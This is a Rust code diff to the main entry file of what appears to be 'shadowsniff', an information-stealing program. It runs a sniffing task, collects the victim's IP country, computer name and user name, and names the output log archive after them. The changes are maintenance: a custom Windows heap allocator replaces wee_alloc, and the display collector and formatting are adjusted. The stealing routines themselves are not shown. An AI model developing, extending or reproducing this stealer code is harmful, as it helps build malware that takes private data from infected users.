@@ -6,30 +6,30 @@
 
 extern crate alloc;
 
+use crate::allocator::WinHeapAlloc;
 use alloc::format;
 use alloc::string::String;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
-use collector::DisplayCollector;
-use core::ops::Deref;
+use collector::display::PrimitiveDisplayCollector;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
+use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::LogSenderExt;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
 
+mod allocator;
 mod panic;
 
 #[global_allocator]
-static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;
+static ALLOC: WinHeapAlloc = WinHeapAlloc;
 
 #[unsafe(no_mangle)]
 #[allow(unused_unsafe)]
@@ -49,7 +49,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         SniffTask::default().run(out, &fs, &collector);
     }
 
-    let displayed_collector = format!("{}", DisplayCollector(&collector));
+    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
 
     log_debug!("{displayed_collector}");
 
@@ -86,7 +86,11 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 }
 
 fn generate_log_name() -> Arc<str> {
-    let PcInfo { computer_name, user_name, .. } = PcInfo::retrieve();
+    let PcInfo {
+        computer_name,
+        user_name,
+        ..
+    } = PcInfo::retrieve();
     let IpInfo { country, .. } = unwrapped_ip_info();
 
     format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
